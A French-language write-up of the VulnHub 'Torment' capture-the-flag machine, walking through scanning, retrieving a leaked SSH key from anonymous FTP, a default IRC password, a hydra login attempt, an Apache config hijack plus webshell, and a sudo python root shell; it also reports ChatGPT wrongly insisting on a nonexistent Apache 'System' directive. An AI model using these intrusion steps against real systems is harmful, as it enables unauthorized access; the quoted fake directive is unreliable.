---
title: "Solution du CTF Torment de VulnHub"
tags: [CTF, VulnHub]
---

## Nitro
[Torment](https://vulnhub.com/entry/digitalworldlocal-torment,299/) est un autre CTF créé par _Donavan_ et récupérable sur VulnHub.
L'auteur le présente comme compliqué et j'aurais tendance à dire qu'il y a plusieurs étapes laborieuses.
La première concerne l'obtention du premier shell où il faut mieux se renseigner sur les spécificités d'un logiciel pour s'en sortir (pour ma part, [HackTricks](https://book.hacktricks.xyz/welcome/readme) m'a sauvé une fois de plus).

La seconde étape est l'escalade de privilèges. Avec une énumération classique, on est vite dirigé vers ce qu'il faut faire, mais j'ai été trompé sur les conseils d'une IA et j'aurais plutôt dû faire mes recherches à l'ancienne.

On lance un scan Nmap de la VM et celle-ci est riche en services avec un serveur FTP qui semble exposer le contenu de `/var/backups`, un SMB, un serveur CUPS et un `ngircd` :

```
Nmap scan report for 192.168.56.120
Host is up (0.00031s latency).
Not shown: 65516 closed tcp ports (reset)
PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         vsftpd 2.0.8 or later
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.56.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 ftp      ftp        112640 Dec 28  2018 alternatives.tar.0
| -rw-r--r--    1 ftp      ftp          4984 Dec 23  2018 alternatives.tar.1.gz
| -rw-r--r--    1 ftp      ftp         95760 Dec 28  2018 apt.extended_states.0
| -rw-r--r--    1 ftp      ftp         10513 Dec 27  2018 apt.extended_states.1.gz
| -rw-r--r--    1 ftp      ftp         10437 Dec 26  2018 apt.extended_states.2.gz
| -rw-r--r--    1 ftp      ftp           559 Dec 23  2018 dpkg.diversions.0
| -rw-r--r--    1 ftp      ftp           229 Dec 23  2018 dpkg.diversions.1.gz
| -rw-r--r--    1 ftp      ftp           229 Dec 23  2018 dpkg.diversions.2.gz
| -rw-r--r--    1 ftp      ftp           229 Dec 23  2018 dpkg.diversions.3.gz
| -rw-r--r--    1 ftp      ftp           229 Dec 23  2018 dpkg.diversions.4.gz
| -rw-r--r--    1 ftp      ftp           229 Dec 23  2018 dpkg.diversions.5.gz
| -rw-r--r--    1 ftp      ftp           229 Dec 23  2018 dpkg.diversions.6.gz
| -rw-r--r--    1 ftp      ftp           505 Dec 28  2018 dpkg.statoverride.0
| -rw-r--r--    1 ftp      ftp           295 Dec 28  2018 dpkg.statoverride.1.gz
| -rw-r--r--    1 ftp      ftp           295 Dec 28  2018 dpkg.statoverride.2.gz
| -rw-r--r--    1 ftp      ftp           295 Dec 28  2018 dpkg.statoverride.3.gz
| -rw-r--r--    1 ftp      ftp           281 Dec 27  2018 dpkg.statoverride.4.gz
| -rw-r--r--    1 ftp      ftp           208 Dec 23  2018 dpkg.statoverride.5.gz
| -rw-r--r--    1 ftp      ftp           208 Dec 23  2018 dpkg.statoverride.6.gz
| -rw-r--r--    1 ftp      ftp       1719127 Jan 01  2019 dpkg.status.0
|_Only 20 shown. Use --script-args ftp-anon.maxlist=-1 to see all.
22/tcp    open  ssh         OpenSSH 7.4p1 Debian 10+deb9u4 (protocol 2.0)
| ssh-hostkey: 
|   2048 84c7317a217d10d3a99c73c2c22dd677 (RSA)
|   256 a512e77ff017cef16aa5bc1f69ac1404 (ECDSA)
|_  256 66c7d0be8d9d9fbf7867d2bccc7d33b9 (ED25519)
25/tcp    open  smtp        Postfix smtpd
|_smtp-commands: TORMENT.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8
| ssl-cert: Subject: commonName=TORMENT
| Subject Alternative Name: DNS:TORMENT
| Not valid before: 2018-12-23T14:28:47
|_Not valid after:  2028-12-20T14:28:47
|_ssl-date: TLS randomness does not represent time
80/tcp    open  http        Apache httpd 2.4.25
|_http-server-header: Apache/2.4.25
|_http-title: Apache2 Debian Default Page: It works
111/tcp   open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100003  3,4         2049/udp   nfs
|   100003  3,4         2049/udp6  nfs
|   100005  1,2,3      42021/tcp   mountd
|   100005  1,2,3      48641/tcp6  mountd
|   100005  1,2,3      53079/udp6  mountd
|   100005  1,2,3      59409/udp   mountd
|   100021  1,3,4      38583/udp6  nlockmgr
|   100021  1,3,4      41961/tcp   nlockmgr
|   100021  1,3,4      45677/tcp6  nlockmgr
|   100021  1,3,4      59994/udp   nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp   open  imap        Dovecot imapd
|_imap-capabilities: Pre-login ID ENABLE IDLE AUTH=LOGINA0001 more listed capabilities AUTH=PLAIN post-login have OK SASL-IR LITERAL+ IMAP4rev1 LOGIN-REFERRALS
445/tcp   open  netbios-ssn Samba smbd 4.5.12-Debian (workgroup: WORKGROUP)
631/tcp   open  ipp         CUPS 2.2
| http-methods: 
|_  Potentially risky methods: PUT
|_http-server-header: CUPS/2.2 IPP/2.1
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Home - CUPS 2.2.1
2049/tcp  open  nfs_acl     3 (RPC #100227)
6667/tcp  open  irc         ngircd
6668/tcp  open  irc         ngircd
6669/tcp  open  irc         ngircd
6672/tcp  open  irc         ngircd
6674/tcp  open  irc         ngircd
34553/tcp open  mountd      1-3 (RPC #100005)
38621/tcp open  mountd      1-3 (RPC #100005)
41961/tcp open  nlockmgr    1-4 (RPC #100021)
42021/tcp open  mountd      1-3 (RPC #100005)
MAC Address: 08:00:27:20:94:5C (Oracle VirtualBox virtual NIC)
Service Info: Hosts:  TORMENT.localdomain, TORMENT, irc.example.net; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.5.12-Debian)
|   Computer name: torment
|   NetBIOS computer name: TORMENT\x00
|   Domain name: \x00
|   FQDN: torment
|_  System time: 2023-03-08T15:48:19+08:00
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-03-08T07:48:19
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: TORMENT, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
|_clock-skew: mean: -1h40m01s, deviation: 4h37m07s, median: 59m57s
```

## She said she really liked my band. In the early 90s, oh yeah

Ce que l'on ne voit pas via l'output Nmap mais qui est visible avec _Filezilla_ c'est que le partage FTP contient aussi des dossiers cachés nommés après des protocoles (`.imap`, `.cups`, `.samba`, etc).

Je relève surtout la présence du fichier `.ngircd/channels` dont le contenu est le suivant :

```
channels:
games
tormentedprinter
```

Ainsi qu'un fichier `.ssh/id_rsa` :

```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,C37F0C31D1560056EA1F9204EC405986

U9X/cW7GIiI48TQAzUs5ozEQgexHKiFi2NcoADhs/ax/CTJvZh32k+izzW0mMzl1
mo5HID0qNghIbVbRcN6Zv8cdJ/AhREjy25YZ68zA7GWoyfoch1K/XY0NEnNTchLf
b6k5GEgu5jfQT+pAj1A6jQyzz4A4CGbvD+iEEJRX3qsTlAn6th6dniRORJggnVLB
K4ONTeP4US7GSGTtOD+hwoyoR4zNQKT2Hn/WryoF7LdAXMwf1aNJJJ7YPz1YdSnU
fxXscbOMlXuZ4ouawIVGeYeH85lmOh7aBy5MWsYq/vNC+2pVzVEkRfc6jug1UbdG
hncWxfU92Q47lVuqtc4HPINynD2Q8rBlYrKsEbPqtLyCnBGM/T0Srzztj+IjXUD1
SdbVLmxascquwnIyv2w55vjwJv5dKjLBmrDiY0Doc9YYCGi6cz1p9tsE+G+uRg0r
hGuFXldsYEkoQcJ4iWjsYiqcwWWFfkN+A0rYXqqcDY+aqAy+jXkhyzfmUp3KBz9j
CjR1+7KcmKvNXtjn8V+iv2Nwf+qc2YzBNkBWlwHhxIz6L8F3k3OkqnZUqPKCW2Ga
CNMcIYx3+Gde3aXpHXg4OFALV7y23N8A2h97VOqnnrnED46C39shkA8iiMNdH9mz
87TWgw+wPLbWXJO7G5nJL0qciLV/Eo6atSof3FUx/4WX4fmYeg1Rdy0KgTC1NRGn
VT/YnlBrNW3f7fdhk/YhHbcT9vCg9/Nm3hmzQX/FBP085SgeEA+ebNMzQwPmqcfb
jGpMPdhD7iLmKPwQL3RFTVODjUyzsgJ6kz83aQd80qPClopqp4NFMLwATVpbN858
d4Q0QQGrCRqu2SYaYmVhGo37BJXKE11y0JzWXOhiVLD0I9fBoHDmsKHN4Aw3lbVE
/n+B0Qa1bIMGfXP7J4r7/+4trQCGi7ngVfhtygtg6j/HcoXDy9y15zrHZqKerWd6
6ApM1caan4T0FjqlqTOQsN5GmB9sBCu02VQ1QF3Z4FVA9oW+pkNFxAeKIddG1yLM
5L1ePDgEYjik6vM1lE/65c7fNaO8dndMau4reUnPbTFqKsTA46uUaMyOV6S7nsys
kHGcAXLEzvbC8ojK1Pg5Llok6f8YN+H7cP6vE1yCfx3oU3GdWV36AgBWLON8+Wwc
icoyqfW6E2I0xz5nlHoea/7szCNBI4wZmRI+GRcRgegQvG06QvdXNzjqdezbb4ba
EXRnMddmfjFSihlUhsKxLhCmbaJk5mG2oGLHQcOurvOUPh/qgRBfUf3PTntuUoa0
0+tGGaLYibDNb5eXQ39Bsjzm8BWG/dSK/Qq7UU4Bk2bTKikWQLazPAy482BsZpWI
mXt8ISmJqldgdrtnVvG3zoQBQpspZ6HTojheNazfD4zzvduQguOcKrCNICxoSRgA
egRER+uxaLqNGz+6H+9sl7FYWalMa+VzjrEDU7PeZNgOj9PxLdKbstQLQxC/Zq6+
7kYu2pHwqP2HcXmdJ9xYnptwkuqh5WGR82Zk+JkKwUBEQJmbVxjqWLjCV/CDA06z
6VvrfrPo3xt/CoZkH66qcm9LCTcM3DsLs3UT4B7aH5wk4l5MmpVI4/mx2Dlv0Mkv
-----END RSA PRIVATE KEY-----
```

Comme on le voit la clé est protégée par une passphrase que j'ai essayé de casser avec `ssh2john` puis `JtR`... sans succès.

On ne dispose d'aucun accès en écriture sur les dossiers présents sur le FTP.

NFS est aussi présent sur la machine donc je continue d'explorer les partages :

```console
$ showmount -e 192.168.56.120
Export list for 192.168.56.120:
/var/torture *
/var/public  *
```

Sur le partage `public`, on trouve des fichiers vides en rapport avec l'imprimante :

```console
$ sudo mount 192.168.56.120:/var/public /mnt/
$ ls /mnt/ -al
total 4
drwxr-xr-x 2 root root 4096 31 déc.   2018 .
drwxr-xr-x 1 root root  176 27 févr.  2022 ..
-rw-r--r-- 1 root root    0 27 déc.   2018 printer-details.txt
-rw-r--r-- 1 root root    0 31 déc.   2018 printer-development.txt
-rw-r--r-- 1 root root    0 31 déc.   2018 printer-director.txt
-rw-r--r-- 1 root root    0 27 déc.   2018 printer-info.txt
-rw-r--r-- 1 root root    0 31 déc.   2018 printer-intern.txt
-rw-r--r-- 1 root root    0 27 déc.   2018 printer-locations.txt
-rw-r--r-- 1 root root    0 27 déc.   2018 printer-procurement.txt
$ sudo umount /mnt
```

Quant au partage `torture`, il n'y a rien dedans.

Pour ce qui est du SMB il semble que l'on ne parviendra pas à en tirer quoi que ce soit sans identifiants.

Pour ce qui est de CUPS, sur le serveur web qui écoute sur le port 631, on trouve différentes imprimantes nommées après leurs utilisateurs. Voici un extrait de la page web :

```html
<A HREF="/printers/Albert&#39;s_Personal_Printer">Albert&#39;s_Personal_Printer</A>
```

Un peu de scraping va nous aider à extraire les utilisateurs mentionnés :
```python
import re
import requests
from bs4 import BeautifulSoup

html_code = requests.get("http://192.168.56.120:631/printers/").text
soup = BeautifulSoup(html_code, "html.parser")
link_regex = re.compile(r"/printers/(\w+)")
for link in soup.find_all("a", href=link_regex):
    username = link_regex.search(link["href"]).group(1)
    print(username.lower())
```

soit :

```
albert
cherrlt
david
edmund
ethan
eva
genevieve
govindasamy
jessica
kenny
patrick
qinyi
qiu
roland
sara
```

## ASV ?

J'ai tenté de me connecter sur le serveur IRC mais à chaque fois, je me faisais jeter... J'ai testé différents clients : _Pidgin_ que j'avais déjà, _HexChat_ que j'ai installé et un pour Gnome que j'ai finalement bazardé.

_HexChat_ est le plus spécifique à IRC donc on a plus de vision sur ce qu'il se passe. J'ai tout de même utilisé _Wireshark_ pour voir ce qu'il se passait.
J'ai tenté d'utiliser les noms d'utilisateurs précédemment extraits :

```
CAP LS 302
NICK david
USER david 0 * :david
:irc.example.net CAP * LS :multi-prefix
CAP REQ :multi-prefix
:irc.example.net CAP david ACK :multi-prefix
CAP END
ERROR :Access denied: Bad password?
```

Ci-dessus les réponses du serveur sont la dernière ligne ainsi que celles commençant par `:`.

Finalement [HackTricks a quelque chose à dire à propos de IRC](https://book.hacktricks.xyz/network-services-pentesting/pentesting-irc#manual) : 

> You can, also, atttempt to login to the server with a password. The default password for ngIRCd is 'wealllikedebian'.

Tant de temps perdu pour un mot de passe par défaut...

À partir de là on peut utiliser n'importe quel login avec ce mot de passe :

```
CAP LS 302
PASS wealllikedebian
NICK sirius
USER sirius 0 * :realname
:irc.example.net CAP * LS :multi-prefix
CAP REQ :multi-prefix
CAP END
:irc.example.net CAP sirius ACK :multi-prefix
:irc.example.net 001 sirius :Welcome to the Internet Relay Network sirius!~sirius@192.168.56.1
:irc.example.net 002 sirius :Your host is irc.example.net, running version ngircd-24 (x86_64/pc/linux-gnu)
:irc.example.net 003 sirius :This server has been started Wed Mar 08 2023 at 15:46:35 (+08)
:irc.example.net 004 sirius irc.example.net ngircd-24 abBcCFiIoqrRswx abehiIklmMnoOPqQrRstvVz
:irc.example.net 005 sirius NETWORK=TORMENT.local :is my network name
:irc.example.net 005 sirius RFC2812 IRCD=ngIRCd CHARSET=UTF-8 CASEMAPPING=ascii PREFIX=(qaohv)~&@%+ CHANTYPES=#&+ CHANMODES=beI,k,l,imMnOPQRstVz CHANLIMIT=#&+:10 :are supported on this server
:irc.example.net 005 sirius CHANNELLEN=50 NICKLEN=9 TOPICLEN=490 AWAYLEN=127 KICKLEN=400 MODES=5 MAXLIST=beI:50 EXCEPTS=e INVEX=I PENALTY :are supported on this server
:irc.example.net 251 sirius :There are 1 users and 0 services on 1 servers
:irc.example.net 254 sirius 3 :channels formed
:irc.example.net 255 sirius :I have 1 users, 0 services and 0 servers
:irc.example.net 265 sirius 1 1 :Current local users: 1, Max: 1
:irc.example.net 266 sirius 1 1 :Current global users: 1, Max: 1
:irc.example.net 250 sirius :Highest connection count: 10 (769 connections received)
:irc.example.net 375 sirius :- irc.example.net message of the day
:irc.example.net 372 sirius :- **************************************************
:irc.example.net 372 sirius :- *             H    E    L    L    O              *
:irc.example.net 372 sirius :- *  This is TORMENT. Breaking us will be torture  *
:irc.example.net 372 sirius :- *  for you, so why even bother trying harder?    *
:irc.example.net 372 sirius :- *                    TORMENT                     *
:irc.example.net 372 sirius :- **************************************************
:irc.example.net 376 sirius :End of MOTD command
LIST
:irc.example.net 321 sirius Channel :Users  Name
:irc.example.net 322 sirius &SERVER 0 :Server Messages
:irc.example.net 322 sirius #tormentedprinter 0 :If you find that the printers are not printing as they should, you can configure them and check for jammed jobs by logging in with the password "mostmachineshaveasupersecurekeyandalongpassphrase".
:irc.example.net 322 sirius #games 0 :Welcome to the Games Channel!
:irc.example.net 323 sirius :End of LIST
```

Dans la logique j'ai tenté d'utiliser le mot de passe `mostmachineshaveasupersecurekeyandalongpassphrase` pour CUPS :

```console
$ hydra -t 1 -L /tmp/users.txt -p mostmachineshaveasupersecurekeyandalongpassphrase https-get://192.168.56.120:631/admin/log/access_log
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-03-08 11:26:47
[DATA] max 1 task per 1 server, overall 1 task, 15 login tries (l:15/p:1), ~15 tries per task
[DATA] attacking http-gets://192.168.56.120:631/admin/log/access_log
1 of 1 target completed, 0 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-03-08 11:27:17
```

Rien du tout... Mais qui dit passphrase dit clé SSH. Étrangement _JtR_ ne parvenait pas à casser la clé même si on lui passait explicitement le mot de passe. Mais en testant les utilisateurs manuellement on arrive à nos fins : 

```console
$ ssh -i id_rsa patrick@192.168.56.120
Enter passphrase for key 'id_rsa': 
Linux TORMENT 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Mar  8 19:31:47 2023 from 192.168.56.1
patrick@TORMENT:~$ id
uid=1001(patrick) gid=1001(patrick) groups=1001(patrick)
```

L'utilisateur dispose de droits `sudo` pour arrêter et redémarrer la machine, mais rien de hackable.

```console
patrick@TORMENT:~$ sudo -l
Matching Defaults entries for patrick on TORMENT:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User patrick may run the following commands on TORMENT:
    (ALL) NOPASSWD: /bin/systemctl poweroff, /bin/systemctl halt, /bin/systemctl reboot
```

## Qiu est le joueur en première base ?

J'ai donc cherché les fichiers sur lesquels je peux agir :

```console
patrick@TORMENT:~$ find / -user root -writable -ls 2> /dev/null | grep -v /proc | grep -v /sys
    19047      0 srw-rw-rw-   1 root     root            0 Mar  8 15:46 /run/minissdpd.sock
    13637      0 srw-rw-rw-   1 root     root            0 Mar  8 15:46 /run/dovecot/dns-client
    13629      0 srw-rw-rw-   1 root     root            0 Mar  8 15:46 /run/dovecot/imap-urlauth
    13619      0 srw-rw-rw-   1 root     root            0 Mar  8 15:46 /run/dovecot/indexer
    13602      0 srw-rw-rw-   1 root     root            0 Mar  8 15:46 /run/dovecot/ssl-params
    22970      0 srw-rw-rw-   1 root     root            0 Mar  8 15:51 /run/cups/cups.sock
--- snip ---
   262586      8 -rwxrwxrwx   1 root     root         7224 Nov  4  2018 /etc/apache2/apache2.conf
   665276      4 drwx-wx-wt   2 root     root         4096 Jan  2  2017 /var/lib/php/sessions
   655542      4 drwxrwxrwt  36 root     root         4096 Mar  8 19:39 /var/tmp
   656669      4 drwxrwxrwt   2 root     root         4096 Nov 22  2018 /var/spool/samba
   664367      0 srw-rw-rw-   1 root     root            0 Mar  8 15:46 /var/spool/postfix/dev/log
   664372      0 crw-rw-rw-   1 root     root       1,   8 Mar  8 15:46 /var/spool/postfix/dev/random
   664373      0 crw-rw-rw-   1 root     root       1,   9 Mar  8 15:46 /var/spool/postfix/dev/urandom
   655538      0 lrwxrwxrwx   1 root     root            9 Dec 23  2018 /var/lock -> /run/lock
```

Il y a le fichier de configuration d'Apache, on va voir ça plus loin.

Mais au fait notre partage NFS ?

```console
patrick@TORMENT:/tmp$ cat /etc/exports 
# /etc/exports: the access control list for filesystems which may be exported
#               to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#
/var/public *(ro,sync,all_squash)
/var/torture *(ro,sync,all_squash)
```

Les deux sont en lecture seule donc c'est une impasse.

Pour revenir à Apache, il y a une directive pour choisir quel utilisateur fait tourner les process. Les lignes par défaut sont les suivantes :

```apache
# These need to be set in /etc/apache2/envvars
User ${APACHE_RUN_USER}
Group ${APACHE_RUN_GROUP}
```

J'ai donc tenté de changer ça par `root`. Additionnellement, ChatGPT m'a parlé d'une directive `System` pour exécuter des commandes.

Je suis donc parti sur cette config :

```apache
# These need to be set in /etc/apache2/envvars
User root
Group root
System "chmod 4755 /bin/dash"
```

Mais après reboot de la machine, Apache était en erreur.
Il aura fallu m'en tenir à la config suivante :

```apache
# These need to be set in /etc/apache2/envvars
User qiu
Group qiu
```

Après redémarrage, on a le fonctionnement attendu :

```console
patrick@TORMENT:~$ ps aux | grep apache
root       656  0.4  2.5 288220 26308 ?        Ss   21:05   0:00 /usr/sbin/apache2 -k start
qiu        737  0.0  0.8 288164  8540 ?        S    21:05   0:00 /usr/sbin/apache2 -k start
qiu        738  0.0  0.7 288244  7976 ?        S    21:05   0:00 /usr/sbin/apache2 -k start
qiu        739  0.0  0.7 288244  7976 ?        S    21:05   0:00 /usr/sbin/apache2 -k start
qiu        740  0.0  0.7 288244  7976 ?        S    21:05   0:00 /usr/sbin/apache2 -k start
qiu        741  0.0  0.7 288244  7976 ?        S    21:05   0:00 /usr/sbin/apache2 -k start
qiu        742  0.0  0.7 288244  7976 ?        S    21:05   0:00 /usr/sbin/apache2 -k start
patrick   1064  0.0  0.0  12784   948 pts/0    S+   21:06   0:00 grep apache
```

L'exploitation est possible grace au fait que la racine web est world-writable :

```console
patrick@TORMENT:~$ ls -ld /var/www/html/
drwxrwxrwx 2 www-data www-data 4096 Jan  1  2019 /var/www/html/
```

Donc on peut simplement placer un webshell et l'appeler pour obtenir un shell en tant que `qiu`.
À partir de ce compte passer root s'annonce aisé :

```console
qiu@TORMENT:~$ sudo -l
Matching Defaults entries for qiu on TORMENT:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User qiu may run the following commands on TORMENT:
    (ALL) NOPASSWD: /usr/bin/python, /bin/systemctl
```

Finish :

```console
qiu@TORMENT:~$ sudo /usr/bin/python
Python 2.7.13 (default, Sep 26 2018, 18:42:22) 
[GCC 6.3.0 20170516] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> import pty
>>> pty.spawn("/bin/bash")
root@TORMENT:/home/qiu# cd /root
root@TORMENT:~# ls
author-secret.txt  proof.txt
root@TORMENT:~# cat proof.txt
Congrutulations on rooting TORMENT. I hope this box has been as fun for you as it has been for me. :-)

Until then, try harder!
```

## Il m'a pris pour Sarah Connor ?

Avec un accès root je peux désormais lire `/var/log/syslog` pour déterminer ce qui clochait dans les directives.
Par exemple, on ne peut pas utiliser `root` pour faire tourner Apache bien que le process parent soit lancé avec l'utilisateur (pour une raison évidente d'écoute sur un port privilégié) :

```
Mar  8 23:04:06 TORMENT systemd[1]: Starting The Apache HTTP Server...
Mar  8 23:04:06 TORMENT apachectl[1725]: AH00526: Syntax error on line 115 of /etc/apache2/apache2.conf:
Mar  8 23:04:06 TORMENT apachectl[1725]: Error:\tApache has not been designed to serve pages while\n\trunning as root.  There are known race conditions that\n\twill allow any local user to read any file on the system.\n\tIf you still desire to serve pages as root then\n\tadd -DBIG_SECURITY_HOLE to the CFLAGS env variable\n\tand then rebuild the server.\n\tIt is strongly suggested that you instead modify the User\n\tdirective in your httpd.conf file to list a non-root\n\tuser.\n
Mar  8 23:04:06 TORMENT apachectl[1725]: Action 'start' failed.
Mar  8 23:04:06 TORMENT apachectl[1725]: The Apache error log may have more information.
Mar  8 23:04:06 TORMENT systemd[1]: apache2.service: Control process exited, code=exited status=1
Mar  8 23:04:06 TORMENT systemd[1]: Failed to start The Apache HTTP Server.
Mar  8 23:04:06 TORMENT systemd[1]: apache2.service: Unit entered failed state.
Mar  8 23:04:06 TORMENT systemd[1]: apache2.service: Failed with result 'exit-code'.
```

Quant à la directive `System` ou un soi-disant module Apache `mod_system`... ils n'existent pas :

```
Mar  8 23:24:16 TORMENT apachectl[1910]: Invalid command 'System', perhaps misspelled or defined by a module not included in the server configuration
```

_ChatGPT_ m'a pourtant soutenu le contraire pendant une vingtaine de minutes. Gardons un œil sur _SkyNet_ !
